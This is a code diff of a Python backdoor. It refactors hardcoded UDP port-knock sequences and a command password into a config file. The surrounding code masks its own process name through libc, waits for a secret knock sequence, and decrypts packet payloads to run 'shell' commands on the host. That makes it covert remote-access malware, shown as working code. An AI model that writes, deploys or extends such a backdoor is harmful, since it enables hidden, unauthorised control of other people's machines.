@@ -11,6 +11,7 @@ password = 'abcdefyoyo'
 # unauthClients = {}
 # authedClients = {}
 
+
 def setProcessName(name):
     libc = cdll.LoadLibrary('libc.so.6')
     buff = create_string_buffer(len(name) + 1)
@@ -29,18 +30,17 @@ def maskProcess():
 
 def knock(packet):
     global state
-    global ports
-    global unauthClients
+    knocks = configfile.knock
     if IP in packet:
         if UDP in packet:
             ip = packet[IP].src
-            if packet[UDP].sport == 1000 and state == 0:
+            if packet[UDP].sport == knocks[0]  and state == 0:
                 state = 1
                 print packet[IP].src + " state 1"
-            elif packet[UDP].sport == 2000 and state == 1:
+            elif packet[UDP].sport == knocks[1] and state == 1:
                 state = 2
                 print packet[IP].src + " state 2"
-            elif packet[UDP].sport == 3000 and state == 2:
+            elif packet[UDP].sport == knocks[2] and state == 2:
                 state = 3
                 print packet[IP].src + " state 3"
             else:
@@ -86,8 +86,8 @@ def parseCommand(packet):
     if packet.haslayer(IP) and packet.haslayer(Raw):
         encryptedData = packet['Raw'].load
         data = encryption.decrypt(encryptedData, configfile.password)
-        if data.startswith(password):
-            data = data[len(password):]
+        if data.startswith(configfile.password):
+            data = data[len(configfile.password):]
             commandType, commandString = data.split(' ', 1)
             if commandType == 'shell':
                 shellCommand(packet, commandString)
